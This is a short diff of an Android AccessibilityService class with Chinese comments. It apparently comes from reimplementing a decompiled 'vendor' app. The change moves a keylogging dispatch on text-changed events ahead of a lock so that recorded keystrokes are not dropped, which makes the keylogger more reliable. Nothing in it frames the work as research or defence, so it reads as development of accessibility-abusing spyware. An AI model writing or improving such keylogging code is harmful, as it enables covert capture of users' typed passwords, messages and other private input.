@@ -470,6 +470,11 @@ public class MyAccessibilityService extends AccessibilityService {
             Log.d(TAG, "EVENT: WINDOW_STATE_CHANGED pkg=" + pkg + " cls=" + cls);
         }
 
+        // Keylog: TEXT_CHANGED 事件在锁之前处理，避免被丢弃
+        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            dispatchKeylogEvent(event);
+        }
+
         if (!f227l.tryLock()) {
             Log.e(TAG, "onAccessibilityEvent 事件被忽略:" + (event != null ? event.toString() : "null"));
             return;
@@ -488,11 +493,6 @@ public class MyAccessibilityService extends AccessibilityService {
 
             // vendor: G(event) — 更新根节点 (反编译不完整, 用简化版)
             G(event);
-
-            // Keylog: TYPE_VIEW_TEXT_CHANGED → 键盘记录 (对齐 vendor c0→b0 case 1)
-            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                dispatchKeylogEvent(event);
-            }
 
             // vendor: f0(event) — 引擎分发
             f0(event);
